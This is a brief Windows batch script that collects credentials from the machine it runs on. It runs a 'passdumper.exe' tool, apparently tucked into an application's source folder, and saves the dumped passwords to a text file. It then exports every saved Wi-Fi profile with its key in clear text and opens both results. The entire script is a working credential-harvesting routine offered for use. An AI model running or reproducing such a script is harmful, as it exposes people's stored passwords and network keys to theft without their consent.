@echo done

md "PASS"
src\com\company\Model\scripts\passdumper.exe > PASS\passwords.txt
PASS\passwords.txt

md "WLAN"
@netsh wlan export profile folder="WLAN" key=clear
explorer WLAN